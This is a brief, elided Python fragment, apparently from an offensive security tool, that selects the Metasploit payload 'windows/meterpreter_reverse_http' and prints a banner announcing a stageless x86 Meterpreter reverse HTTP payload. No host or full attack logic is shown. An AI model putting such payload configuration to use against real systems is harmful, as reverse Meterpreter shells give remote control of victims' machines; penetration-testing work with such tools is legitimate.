...
def Construction():
    ...
    RC_PAYLOAD = "windows/meterpreter_reverse_http"
    
    print(core.amcolors.PURPLE + core.amcolors.BOLD + "[STAGELESS] Payload x86 Meterpreter Reverse HTTP" + core.amcolors.ENDC)
